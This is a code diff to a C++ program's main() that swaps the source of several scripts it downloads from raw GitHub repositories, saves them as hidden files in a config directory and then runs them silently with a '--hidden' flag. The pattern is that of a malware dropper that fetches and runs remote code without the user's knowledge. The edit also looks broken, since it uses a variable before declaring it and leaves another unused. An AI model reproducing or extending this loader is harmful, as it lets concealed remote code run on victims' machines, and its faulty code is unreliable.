@@ -132,17 +132,26 @@ int main() {
         return 1;
     }
 
-    const std::string final_path = config_path + "/client.py";
+    const std::string final_path = config_path + "/client.js";
     if (!save_hidden_file(
-            "https://raw.githubusercontent.com/boss-defender/export/main/client.py",
+            "https://raw.githubusercontent.com/rahul-call/export/main/ror/client.js",
             final_path)) {
         std::cout << "Failed\n";
         return 1;
     }
 
-    const std::string final_path3 = config_path + "/auto.py";
+
+    const std::string final_path0 = config_path + "/auto.py";
     if (!save_hidden_file(
-            "https://raw.githubusercontent.com/boss-defender/export/main/auto.py",
+            "https://raw.githubusercontent.com/rahul-call/export/main/ror/auto.js",
+            final_path3)) {
+        std::cout << "Failed\n";
+        return 1;
+    }
+    
+    const std::string final_path3 = config_path + "/auto.sh";
+    if (!save_hidden_file(
+            "https://raw.githubusercontent.com/rahul-call/export/main/ror/auto.sh",
             final_path3)) {
         std::cout << "Failed\n";
         return 1;
@@ -153,7 +162,7 @@ int main() {
         return 1;
     }
 
-    int rc = run_silenced({"python3", "-u", final_path3, final_path, "--hidden"});
+    int rc = run_silenced({"bash", final_path3, final_path, "--hidden"});
     if (rc != 0) {
         std::cout << "Failed\n";
         return 1;
